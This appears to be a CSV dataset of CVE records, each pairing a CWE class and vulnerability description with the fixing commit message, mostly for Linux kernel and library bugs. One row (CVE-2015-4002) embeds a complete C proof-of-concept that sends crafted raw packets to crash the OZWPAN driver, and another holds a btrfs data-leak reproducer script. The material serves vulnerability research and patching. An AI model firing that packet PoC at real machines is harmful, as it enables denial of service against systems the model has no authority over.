CVE-2013-4264,CWE-119,2013-11-23,The kempf_decode_tile function in libavcodec/g2meet.c in FFmpeg before 2.0.1 allows remote attackers to cause a denial of service (out-of-bounds heap write) via a G2M4 encoded file.,Fixes Ticket2842  Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2018-1000039,CWE-416,2018-05-24,"In Artifex MuPDF 1.12.0 and earlier, multiple heap use after free bugs in the PDF parser could allow an attacker to execute arbitrary code, read memory, or cause a denial of service via a crafted file.",
CVE-2016-4997,CWE-264,2016-07-03,The compat IPT_SO_SET_REPLACE and IP6T_SO_SET_REPLACE setsockopt implementations in the netfilter subsystem in the Linux kernel before 4.6.3 allow local users to gain privileges or cause a denial of service (memory corruption) by leveraging in-container root access to provide a crafted offset value that triggers an unintended decrement.,"We're currently asserting that targetoff + targetsize <= nextoff.  Extend it to also check that targetoff is >= sizeof(xt_entry). Since this is generic code, add an argument pointing to the start of the match/target, we can then derive the base structure size from the delta.  We also need the e->elems pointer in a followup change to validate matches.  Signed-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2019-16921,CWE-665,2019-09-27,"In the Linux kernel before 4.17, hns_roce_alloc_ucontext in drivers/infiniband/hw/hns/hns_roce_main.c does not initialize the resp data structure, which might allow attackers to obtain sensitive information from kernel stack memory, aka CID-df7e40425813.","The data in resp will be copied from kernel to userspace, thus it needs to be initialized to zeros to avoid copying uninited stack memory.  Reported-by: Dan Carpenter <dan.carpenter@oracle.com> Fixes: e088a68 (""RDMA/hns: Support rq record doorbell for the user space"") Signed-off-by: Yixian Liu <liuyixian@huawei.com> Signed-off-by: Jason Gunthorpe <jgg@mellanox.com>"
CVE-2017-9526,CWE-200,2017-06-11,"In Libgcrypt before 1.7.7, an attacker who learns the EdDSA session key (from side-channel observation during the signing process) can easily recover the long-term secret key. 1.7.7 makes a cipher/ecc-eddsa.c change to store this session key in secure memory, to ensure that constant-time point operations are used in the MPI library.",
CVE-2015-7884,CWE-200,2015-12-28,"The vivid_fb_ioctl function in drivers/media/platform/vivid/vivid-osd.c in the Linux kernel through 4.3.3 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel memory via a crafted application.",The vivid_fb_ioctl() code fails to initialize the 16 _reserved bytes of struct fb_vblank after the ->hcount member. Add an explicit memset(0) before filling the structure to avoid the info leak.  Signed-off-by: Salva Peiró <speirofr@gmail.com> Signed-off-by: Hans Verkuil <hans.verkuil@cisco.com> Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>
CVE-2017-9605,CWE-200,2017-06-13,"The vmw_gb_surface_define_ioctl function (accessible via DRM_IOCTL_VMW_GB_SURFACE_CREATE) in drivers/gpu/drm/vmwgfx/vmwgfx_surface.c in the Linux kernel through 4.11.4 defines a backup_handle variable but does not give it an initial value. If one attempts to create a GB surface, with a previously allocated DMA buffer to be used as a backup buffer, the backup_handle variable does not get written to and is then later returned to user space, allowing local users to obtain sensitive information from uninitialized kernel memory via a crafted ioctl call.","When vmw_gb_surface_define_ioctl() is called with an existing buffer, we end up returning an uninitialized variable in the backup_handle.  The fix is to first initialize backup_handle to 0 just to be sure, and second, when a user-provided buffer is found, we will use the req->buffer_handle as the backup_handle.  Cc: <stable@vger.kernel.org> Reported-by: Murray McAllister <murray.mcallister@insomniasec.com> Signed-off-by: Sinclair Yeh <syeh@vmware.com> Reviewed-by: Deepak Rawat <drawat@vmware.com>"
CVE-2006-5331,CWE-19,2017-10-29,"The altivec_unavailable_exception function in arch/powerpc/kernel/traps.c in the Linux kernel before 2.6.19 on 64-bit systems mishandles the case where CONFIG_ALTIVEC is defined and the CPU actually supports Altivec, but the Altivec support was not detected by the kernel, which allows local users to cause a denial of service (panic) by triggering execution of an Altivec instruction.",At the moment we rely on a cpu feature bit or a firmware property to detect altivec. If we dont have either of these and the cpu does in fact support altivec we can cause a panic from userspace.  It seems safer to always send a signal if we manage to get an 0xf20 exception from userspace.  Signed-off-by: Anton Blanchard <anton@samba.org> Signed-off-by: Paul Mackerras <paulus@samba.org>
CVE-2013-1828,CWE-20,2013-03-22,"The sctp_getsockopt_assoc_stats function in net/sctp/socket.c in the Linux kernel before 3.8.4 does not validate a size value before proceeding to a copy_from_user operation, which allows local users to gain privileges via a crafted application that contains an SCTP_GET_ASSOC_STATS getsockopt system call.","Building sctp may fail with:  In function ‘copy_from_user’,     inlined from ‘sctp_getsockopt_assoc_stats’ at     net/sctp/socket.c:5656:20: arch/x86/include/asm/uaccess_32.h:211:26: error: call to     ‘copy_from_user_overflow’ declared with attribute error: copy_from_user()     buffer size is not provably correct  if built with W=1 due to a missing parameter size validation before the call to copy_from_user.  Signed-off-by: Guenter Roeck <linux@roeck-us.net> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-4558,,2016-05-23,"The BPF subsystem in the Linux kernel before 4.5.5 mishandles reference counts, which allows local users to cause a denial of service (use-after-free) or possibly have unspecified other impact via a crafted application on (1) a system with more than 32 Gb of memory, related to the program reference count or (2) a 1 Tb system, related to the map reference count.","On a system with >32Gbyte of phyiscal memory and infinite RLIMIT_MEMLOCK, the malicious application may overflow 32-bit bpf program refcnt. It's also possible to overflow map refcnt on 1Tb system. Impose 32k hard limit which means that the same bpf program or map cannot be shared by more than 32k processes.  Fixes: 1be7f75 (""bpf: enable non-root eBPF programs"") Reported-by: Jann Horn <jannh@google.com> Signed-off-by: Alexei Starovoitov <ast@kernel.org> Acked-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-11593,CWE-787,2018-05-31,Espruino before 1.99 allows attackers to cause a denial of service (application crash) and potential Information Disclosure with a user crafted input file via a Buffer Overflow during syntax parsing because strncpy is misused in jslex.c.,
CVE-2017-5209,CWE-125,2017-01-11,The base64decode function in base64.c in libimobiledevice libplist through 1.12 allows attackers to obtain sensitive information from process memory or cause a denial of service (buffer over-read) via split encoded Apple Property List data.,
CVE-2016-8654,CWE-119,2018-08-01,A heap-buffer overflow vulnerability was found in QMFB code in JPC codec caused by buffer being allocated with too small size. jasper versions before 2.0.0 are affected.,that was caused by a buffer being allocated with a size that was too small in some cases. Added a new regression test case.
CVE-2017-17856,CWE-119,2017-12-27,kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging the lack of stack-pointer alignment enforcement.,"Force strict alignment checks for stack pointers because the tracking of stack spills relies on it; unaligned stack accesses can lead to corruption of spilled registers, which is exploitable.  Fixes: f1174f7 (""bpf/verifier: rework value tracking"") Signed-off-by: Jann Horn <jannh@google.com> Signed-off-by: Alexei Starovoitov <ast@kernel.org> Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>"
CVE-2017-6874,CWE-362,2017-03-14,Race condition in kernel/ucount.c in the Linux kernel through 4.10.2 allows local users to cause a denial of service (use-after-free and system crash) or possibly have unspecified other impact via crafted system calls that leverage certain decrement behavior that causes incorrect interaction between put_ucounts and get_ucounts.,"Always increment/decrement ucount->count under the ucounts_lock.  The increments are there already and moving the decrements there means the locking logic of the code is simpler.  This simplification in the locking logic fixes a race between put_ucounts and get_ucounts that could result in a use-after-free because the count could go zero then be found by get_ucounts and then be freed by put_ucounts.  A bug presumably this one was found by a combination of syzkaller and KASAN.  JongWhan Kim reported the syzkaller failure and Dmitry Vyukov spotted the race in the code.  Cc: stable@vger.kernel.org Fixes: f6b2db1 (""userns: Make the count of user namespaces per user"") Reported-by: JongHwan Kim <zzoru007@gmail.com> Reported-by: Dmitry Vyukov <dvyukov@google.com> Reviewed-by: Andrei Vagin <avagin@gmail.com> Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com>"
CVE-2014-3122,CWE-400,2014-05-11,"The try_to_unmap_cluster function in mm/rmap.c in the Linux kernel before 3.14.3 does not properly consider which pages must be locked, which allows local users to cause a denial of service (system crash) by triggering a memory-usage pattern that requires removal of page-table mappings.","A BUG_ON(!PageLocked) was triggered in mlock_vma_page() by Sasha Levin fuzzing with trinity.  The call site try_to_unmap_cluster() does not lock the pages other than its check_page parameter (which is already locked).  The BUG_ON in mlock_vma_page() is not documented and its purpose is somewhat unclear, but apparently it serializes against page migration, which could otherwise fail to transfer the PG_mlocked flag.  This would not be fatal, as the page would be eventually encountered again, but NR_MLOCK accounting would become distorted nevertheless.  This patch adds a comment to the BUG_ON in mlock_vma_page() and munlock_vma_page() to that effect.  The call site try_to_unmap_cluster() is fixed so that for page != check_page, trylock_page() is attempted (to avoid possible deadlocks as we already have check_page locked) and mlock_vma_page() is performed only upon success.  If the page lock cannot be obtained, the page is left without PG_mlocked, which is again not a problem in the whole unevictable memory design.  Signed-off-by: Vlastimil Babka <vbabka@suse.cz> Signed-off-by: Bob Liu <bob.liu@oracle.com> Reported-by: Sasha Levin <sasha.levin@oracle.com> Cc: Wanpeng Li <liwanp@linux.vnet.ibm.com> Cc: Michel Lespinasse <walken@google.com> Cc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com> Acked-by: Rik van Riel <riel@redhat.com> Cc: David Rientjes <rientjes@google.com> Cc: Mel Gorman <mgorman@suse.de> Cc: Hugh Dickins <hughd@google.com> Cc: Joonsoo Kim <iamjoonsoo.kim@lge.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2016-1624,CWE-119,2016-02-14,"Integer underflow in the ProcessCommandsInternal function in dec/decode.c in Brotli, as used in Google Chrome before 48.0.2564.109, allows remote attackers to cause a denial of service (buffer overflow) or possibly have unspecified other impact via crafted data with brotli compression.",
CVE-2016-2782,CWE-476,2016-04-27,The treo_attach function in drivers/usb/serial/visor.c in the Linux kernel before 4.5 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by inserting a USB device that lacks a (1) bulk-in or (2) interrupt-in endpoint.,"Fix null-pointer dereference at probe should a (malicious) Treo device lack the expected endpoints.  Specifically, the Treo port-setup hack was dereferencing the bulk-in and interrupt-in urbs without first making sure they had been allocated by core.  Fixes: 1da177e4c3f4 (""Linux-2.6.12-rc2"") Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org>"
CVE-2015-5302,CWE-200,2015-12-07,"libreport 2.0.7 before 2.6.3 only saves changes to the first file when editing a crash report, which allows remote attackers to obtain sensitive information via unspecified vectors related to the (1) backtrace, (2) cmdline, (3) environ, (4) open_fds, (5) maps, (6) smaps, (7) hostname, (8) remote, (9) ks.cfg, or (10) anaconda-tb file attachment included in a Red Hat Bugzilla bug report.","If the user reviewed the dump dir's files during reporting the crash, the changes was thrown away and original data was passed to the bugzilla bug report.  report-gtk saves the first text view buffer and then reloads data from the reported problem directory, which causes that the changes made to those text views are thrown away.  Function save_text_if_changed(), except of saving text, also reload the files from dump dir and update gui state from the dump dir. The commit moves the reloading and updating gui functions away from this function.  Related to rhbz#1270235  Signed-off-by: Matej Habrnal <mhabrnal@redhat.com>"
CVE-2017-15924,CWE-78,2017-10-27,"In manager.c in ss-manager in shadowsocks-libev 3.1.0, improper parsing allows command injection via shell metacharacters in a JSON configuration request received via 127.0.0.1 UDP traffic, related to the add_server, build_config, and construct_command_line functions.",
CVE-2012-1097,CWE-476,2012-05-17,"The regset (aka register set) feature in the Linux kernel before 3.2.10 does not properly handle the absence of .get and .set methods, which allows local users to cause a denial of service (NULL pointer dereference) or possibly have unspecified other impact via a (1) PTRACE_GETREGSET or (2) PTRACE_SETREGSET ptrace call.","The regset common infrastructure assumed that regsets would always have .get and .set methods, but not necessarily .active methods. Unfortunately people have since written regsets without .set methods.  Rather than putting in stub functions everywhere, handle regsets with null .get or .set methods explicitly.  Signed-off-by: H. Peter Anvin <hpa@zytor.com> Reviewed-by: Oleg Nesterov <oleg@redhat.com> Acked-by: Roland McGrath <roland@hack.frob.com> Cc: <stable@vger.kernel.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2015-1805,CWE-17,2015-08-08,"The (1) pipe_read and (2) pipe_write implementations in fs/pipe.c in the Linux kernel before 3.16 do not properly consider the side effects of failed __copy_to_user_inatomic and __copy_from_user_inatomic calls, which allows local users to cause a denial of service (system crash) or possibly gain privileges via a crafted application, aka an ""I/O vector array overrun.""",parallel to copy_page_to_iter().  pipe_write() switched to it (and became ->write_iter()).  Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>
CVE-2015-4002,CWE-119,2015-06-07,"drivers/staging/ozwpan/ozusbsvc1.c in the OZWPAN driver in the Linux kernel through 4.0.5 does not ensure that certain length values are sufficiently large, which allows remote attackers to cause a denial of service (system crash or large loop) or possibly execute arbitrary code via a crafted packet, related to the (1) oz_usb_rx and (2) oz_usb_handle_ep_data functions.","Since elt->length is a u8, we can make this variable a u8. Then we can do proper bounds checking more easily. Without this, a potentially negative value is passed to the memcpy inside oz_hcd_get_desc_cnf, resulting in a remotely exploitable heap overflow with network supplied data.  This could result in remote code execution. A PoC which obtains DoS follows below. It requires the ozprotocol.h file from this module.  =-=-=-=-=-=   #include <arpa/inet.h>  #include <linux/if_packet.h>  #include <net/if.h>  #include <netinet/ether.h>  #include <stdio.h>  #include <string.h>  #include <stdlib.h>  #include <endian.h>  #include <sys/ioctl.h>  #include <sys/socket.h>   #define u8 uint8_t  #define u16 uint16_t  #define u32 uint32_t  #define __packed __attribute__((__packed__))  #include ""ozprotocol.h""  static int hex2num(char c) { 	if (c >= '0' && c <= '9') 		return c - '0'; 	if (c >= 'a' && c <= 'f') 		return c - 'a' + 10; 	if (c >= 'A' && c <= 'F') 		return c - 'A' + 10; 	return -1; } static int hwaddr_aton(const char *txt, uint8_t *addr) { 	int i; 	for (i = 0; i < 6; i++) { 		int a, b; 		a = hex2num(*txt++); 		if (a < 0) 			return -1; 		b = hex2num(*txt++); 		if (b < 0) 			return -1; 		*addr++ = (a << 4) | b; 		if (i < 5 && *txt++ != ':') 			return -1; 	} 	return 0; }  int main(int argc, char *argv[]) { 	if (argc < 3) { 		fprintf(stderr, ""Usage: %s interface destination_mac\n"", argv[0]); 		return 1; 	}  	uint8_t dest_mac[6]; 	if (hwaddr_aton(argv[2], dest_mac)) { 		fprintf(stderr, ""Invalid mac address.\n""); 		return 1; 	}  	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW); 	if (sockfd < 0) { 		perror(""socket""); 		return 1; 	}  	struct ifreq if_idx; 	int interface_index; 	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1); 	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) { 		perror(""SIOCGIFINDEX""); 		return 1; 	} 	interface_index = if_idx.ifr_ifindex; 	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) { 		perror(""SIOCGIFHWADDR""); 		return 1; 	} 	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;  	struct { 		struct ether_header ether_header; 		struct oz_hdr oz_hdr; 		struct oz_elt oz_elt; 		struct oz_elt_connect_req oz_elt_connect_req; 	} __packed connect_packet = { 		.ether_header = { 			.ether_type = htons(OZ_ETHERTYPE), 			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, 			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } 		}, 		.oz_hdr = { 			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), 			.last_pkt_num = 0, 			.pkt_num = htole32(0) 		}, 		.oz_elt = { 			.type = OZ_ELT_CONNECT_REQ, 			.length = sizeof(struct oz_elt_connect_req) 		}, 		.oz_elt_connect_req = { 			.mode = 0, 			.resv1 = {0}, 			.pd_info = 0, 			.session_id = 0, 			.presleep = 35, 			.ms_isoc_latency = 0, 			.host_vendor = 0, 			.keep_alive = 0, 			.apps = htole16((1 << OZ_APPID_USB) | 0x1), 			.max_len_div16 = 0, 			.ms_per_isoc = 0, 			.up_audio_buf = 0, 			.ms_per_elt = 0 		} 	};  	struct { 		struct ether_header ether_header; 		struct oz_hdr oz_hdr; 		struct oz_elt oz_elt; 		struct oz_get_desc_rsp oz_get_desc_rsp; 	} __packed pwn_packet = { 		.ether_header = { 			.ether_type = htons(OZ_ETHERTYPE), 			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, 			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } 		}, 		.oz_hdr = { 			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), 			.last_pkt_num = 0, 			.pkt_num = htole32(1) 		}, 		.oz_elt = { 			.type = OZ_ELT_APP_DATA, 			.length = sizeof(struct oz_get_desc_rsp) - 2 		}, 		.oz_get_desc_rsp = { 			.app_id = OZ_APPID_USB, 			.elt_seq_num = 0, 			.type = OZ_GET_DESC_RSP, 			.req_id = 0, 			.offset = htole16(0), 			.total_size = htole16(0), 			.rcode = 0, 			.data = {0} 		} 	};  	struct sockaddr_ll socket_address = { 		.sll_ifindex = interface_index, 		.sll_halen = ETH_ALEN, 		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } 	};  	if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { 		perror(""sendto""); 		return 1; 	} 	usleep(300000); 	if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { 		perror(""sendto""); 		return 1; 	} 	return 0; }  Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com> Acked-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2015-8374,CWE-200,2015-12-28,"fs/btrfs/inode.c in the Linux kernel before 4.3.3 mishandles compressed inline extents, which allows local users to obtain sensitive pre-truncation information from a file via a clone action.","When truncating a file to a smaller size which consists of an inline extent that is compressed, we did not discard (or made unusable) the data between the new file size and the old file size, wasting metadata space and allowing for the truncated data to be leaked and the data corruption/loss mentioned below. We were also not correctly decrementing the number of bytes used by the inode, we were setting it to zero, giving a wrong report for callers of the stat(2) syscall. The fsck tool also reported an error about a mismatch between the nbytes of the file versus the real space used by the file.  Now because we weren't discarding the truncated region of the file, it was possible for a caller of the clone ioctl to actually read the data that was truncated, allowing for a security breach without requiring root access to the system, using only standard filesystem operations. The scenario is the following:     1) User A creates a file which consists of an inline and compressed       extent with a size of 2000 bytes - the file is not accessible to       any other users (no read, write or execution permission for anyone       else);     2) The user truncates the file to a size of 1000 bytes;     3) User A makes the file world readable;     4) User B creates a file consisting of an inline extent of 2000 bytes;     5) User B issues a clone operation from user A's file into its own       file (using a length argument of 0, clone the whole range);     6) User B now gets to see the 1000 bytes that user A truncated from       its file before it made its file world readbale. User B also lost       the bytes in the range [1000, 2000[ bytes from its own file, but       that might be ok if his/her intention was reading stale data from       user A that was never supposed to be public.  Note that this contrasts with the case where we truncate a file from 2000 bytes to 1000 bytes and then truncate it back from 1000 to 2000 bytes. In this case reading any byte from the range [1000, 2000[ will return a value of 0x00, instead of the original data.  This problem exists since the clone ioctl was added and happens both with and without my recent data loss and file corruption fixes for the clone ioctl (patch ""Btrfs: fix file corruption and data loss after cloning inline extents"").  So fix this by truncating the compressed inline extents as we do for the non-compressed case, which involves decompressing, if the data isn't already in the page cache, compressing the truncated version of the extent, writing the compressed content into the inline extent and then truncate it.  The following test case for fstests reproduces the problem. In order for the test to pass both this fix and my previous fix for the clone ioctl that forbids cloning a smaller inline extent into a larger one, which is titled ""Btrfs: fix file corruption and data loss after cloning inline extents"", are needed. Without that other fix the test fails in a different way that does not leak the truncated data, instead part of destination file gets replaced with zeroes (because the destination file has a larger inline extent than the source).    seq=`basename $0`   seqres=$RESULT_DIR/$seq   echo ""QA output created by $seq""   tmp=/tmp/$$   status=1	# failure is the default!   trap ""_cleanup; exit \$status"" 0 1 2 3 15    _cleanup()   {       rm -f $tmp.*   }    # get standard environment, filters and checks   . ./common/rc   . ./common/filter    # real QA test starts here   _need_to_be_root   _supported_fs btrfs   _supported_os Linux   _require_scratch   _require_cloner    rm -f $seqres.full    _scratch_mkfs >>$seqres.full 2>&1   _scratch_mount ""-o compress""    # Create our test files. File foo is going to be the source of a clone operation   # and consists of a single inline extent with an uncompressed size of 512 bytes,   # while file bar consists of a single inline extent with an uncompressed size of   # 256 bytes. For our test's purpose, it's important that file bar has an inline   # extent with a size smaller than foo's inline extent.   $XFS_IO_PROG -f -c ""pwrite -S 0xa1 0 128""   \           -c ""pwrite -S 0x2a 128 384"" \           $SCRATCH_MNT/foo | _filter_xfs_io   $XFS_IO_PROG -f -c ""pwrite -S 0xbb 0 256"" $SCRATCH_MNT/bar | _filter_xfs_io    # Now durably persist all metadata and data. We do this to make sure that we get   # on disk an inline extent with a size of 512 bytes for file foo.   sync    # Now truncate our file foo to a smaller size. Because it consists of a   # compressed and inline extent, btrfs did not shrink the inline extent to the   # new size (if the extent was not compressed, btrfs would shrink it to 128   # bytes), it only updates the inode's i_size to 128 bytes.   $XFS_IO_PROG -c ""truncate 128"" $SCRATCH_MNT/foo    # Now clone foo's inline extent into bar.   # This clone operation should fail with errno EOPNOTSUPP because the source   # file consists only of an inline extent and the file's size is smaller than   # the inline extent of the destination (128 bytes < 256 bytes). However the   # clone ioctl was not prepared to deal with a file that has a size smaller   # than the size of its inline extent (something that happens only for compressed   # inline extents), resulting in copying the full inline extent from the source   # file into the destination file.   #   # Note that btrfs' clone operation for inline extents consists of removing the   # inline extent from the destination inode and copy the inline extent from the   # source inode into the destination inode, meaning that if the destination   # inode's inline extent is larger (N bytes) than the source inode's inline   # extent (M bytes), some bytes (N - M bytes) will be lost from the destination   # file. Btrfs could copy the source inline extent's data into the destination's   # inline extent so that we would not lose any data, but that's currently not   # done due to the complexity that would be needed to deal with such cases   # (specially when one or both extents are compressed), returning EOPNOTSUPP, as   # it's normally not a very common case to clone very small files (only case   # where we get inline extents) and copying inline extents does not save any   # space (unlike for normal, non-inlined extents).   $CLONER_PROG -s 0 -d 0 -l 0 $SCRATCH_MNT/foo $SCRATCH_MNT/bar    # Now because the above clone operation used to succeed, and due to foo's inline   # extent not being shinked by the truncate operation, our file bar got the whole   # inline extent copied from foo, making us lose the last 128 bytes from bar   # which got replaced by the bytes in range [128, 256[ from foo before foo was   # truncated - in other words, data loss from bar and being able to read old and   # stale data from foo that should not be possible to read anymore through normal   # filesystem operations. Contrast with the case where we truncate a file from a   # size N to a smaller size M, truncate it back to size N and then read the range   # [M, N[, we should always get the value 0x00 for all the bytes in that range.    # We expected the clone operation to fail with errno EOPNOTSUPP and therefore   # not modify our file's bar data/metadata. So its content should be 256 bytes   # long with all bytes having the value 0xbb.   #   # Without the btrfs bug fix, the clone operation succeeded and resulted in   # leaking truncated data from foo, the bytes that belonged to its range   # [128, 256[, and losing data from bar in that same range. So reading the   # file gave us the following content:   #   # 0000000 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1   # *   # 0000200 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a   # *   # 0000400   echo ""File bar's content after the clone operation:""   od -t x1 $SCRATCH_MNT/bar    # Also because the foo's inline extent was not shrunk by the truncate   # operation, btrfs' fsck, which is run by the fstests framework everytime a   # test completes, failed reporting the following error:   #   #  root 5 inode 257 errors 400, nbytes wrong    status=0   exit  Cc: stable@vger.kernel.org Signed-off-by: Filipe Manana <fdmanana@suse.com>"
CVE-2018-15863,CWE-476,2018-08-25,Unchecked NULL pointer usage in ResolveStateAndPredicate in xkbcomp/compat.c in xkbcommon before 0.8.2 could be used by local attackers to crash (NULL pointer dereference) the xkbcommon parser by supplying a crafted keymap file with a no-op modmask expression.,"If we have an expression of the form 'l1' in an interp section, we unconditionally try to dereference its args, even if it has none.  Signed-off-by: Daniel Stone <daniels@collabora.com>"
CVE-2017-3731,CWE-125,2017-05-04,"If an SSL/TLS server or client is running on a 32-bit host, and a specific cipher is being used, then a truncated packet can cause that server or client to perform an out-of-bounds read, usually resulting in a crash. For OpenSSL 1.1.0, the crash can be triggered when using CHACHA20/POLY1305; users should upgrade to 1.1.0d. For Openssl 1.0.2, the crash can be triggered when using RC4-MD5; users who have not disabled that algorithm should update to 1.0.2k.",Originally a crash in 32-bit build was reported CHACHA20-POLY1305 cipher. The crash is triggered by truncated packet and is result of excessive hashing to the edge of accessible memory. Since hash operation is read-only it is not considered to be exploitable beyond a DoS condition. Other ciphers were hardened.  Thanks to Robert Święcki for report.  CVE-2017-3731  Reviewed-by: Rich Salz <rsalz@openssl.org>
CVE-2017-13025,CWE-125,2017-09-14,The IPv6 mobility parser in tcpdump before 4.9.2 has a buffer over-read in print-mobility.c:mobility_opt_print().,"This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't cause 'tcpdump: pcap_loop: truncated dump file'"
CVE-2018-15572,,2018-08-20,"The spectre_v2_select_mitigation function in arch/x86/kernel/cpu/bugs.c in the Linux kernel before 4.18.1 does not always fill RSB upon a context switch, which makes it easier for attackers to conduct userspace-userspace spectreRSB attacks.","The article ""Spectre Returns! Speculation Attacks using the Return Stack  Buffer"" [1] describes two new (sub-)variants of spectrev2-like attacks,  making use solely of the RSB contents even on CPUs that don't fallback to  BTB on RSB underflow (Skylake+).  Mitigate userspace-userspace attacks by always unconditionally filling RSB on context switch when the generic spectrev2 mitigation has been enabled.  [1] https://arxiv.org/pdf/1807.07940.pdf  Signed-off-by: Jiri Kosina <jkosina@suse.cz> Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Reviewed-by: Josh Poimboeuf <jpoimboe@redhat.com> Acked-by: Tim Chen <tim.c.chen@linux.intel.com> Cc: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com> Cc: Borislav Petkov <bp@suse.de> Cc: David Woodhouse <dwmw@amazon.co.uk> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: stable@vger.kernel.org Link: https://lkml.kernel.org/r/nycvar.YFH.7.76.1807261308190.997@cbobk.fhfr.pm"
CVE-2013-1773,CWE-119,2013-02-28,"Buffer overflow in the VFAT filesystem implementation in the Linux kernel before 3.3 allows local users to gain privileges or cause a denial of service (system crash) via a VFAT write operation on a filesystem with the utf8 mount option, which is not properly handled during UTF-8 to UTF-16 conversion.","The utf8s_to_utf16s conversion routine needs to be improved.  Unlike its utf16s_to_utf8s sibling, it doesn't accept arguments specifying the maximum length of the output buffer or the endianness of its 16-bit output.  This patch (as1501) adds the two missing arguments, and adjusts the only two places in the kernel where the function is called.  A follow-on patch will add a third caller that does utilize the new capabilities.  The two conversion routines are still annoyingly inconsistent in the way they handle invalid byte combinations.  But that's a subject for a different patch.  Signed-off-by: Alan Stern <stern@rowland.harvard.edu> CC: Clemens Ladisch <clemens@ladisch.de> Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>"
CVE-2017-8924,CWE-191,2017-05-12,The edge_bulk_in_callback function in drivers/usb/serial/io_ti.c in the Linux kernel before 4.10.4 allows local users to obtain sensitive information (in the dmesg ringbuffer and syslog) from uninitialized kernel memory by using a crafted USB device (posing as an io_ti USB serial device) to trigger an integer underflow.,"Add missing sanity check to the bulk-in completion handler to avoid an integer underflow that can be triggered by a malicious device.  This avoids leaking 128 kB of memory content from after the URB transfer buffer to user space.  Fixes: 8c209e6 (""USB: make actual_length in struct urb field u32"") Fixes: 1da177e4c3f4 (""Linux-2.6.12-rc2"") Cc: stable <stable@vger.kernel.org>	# 2.6.30 Signed-off-by: Johan Hovold <johan@kernel.org>"
CVE-2013-7009,CWE-119,2013-12-09,"The rpza_decode_stream function in libavcodec/rpza.c in FFmpeg before 2.1 does not properly maintain a pointer to pixel data, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Apple RPZA data.",Fixes out of array accesses Fixes Ticket2850  Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2016-6520,CWE-125,2016-12-13,Buffer overflow in MagickCore/enhance.c in ImageMagick before 7.0.2-7 allows remote attackers to have unspecified impact via vectors related to pixel cache morphology.,
CVE-2017-5130,CWE-787,2018-02-07,"An integer overflow in xmlmemory.c in libxml2 before 2.9.5, as used in Google Chrome prior to 62.0.3202.62 and other products, allowed a remote attacker to potentially exploit heap corruption via a crafted XML file.",
CVE-2018-0495,CWE-203,2018-06-13,"Libgcrypt before 1.7.10 and 1.8.x before 1.8.3 allows a memory-cache side-channel attack on ECDSA signatures that can be mitigated through the use of blinding during the signing process in the _gcry_ecc_ecdsa_sign function in cipher/ecc-ecdsa.c, aka the Return Of the Hidden Number Problem or ROHNP. To discover an ECDSA key, the attacker needs access to either the local machine or a different virtual machine on the same physical host.",
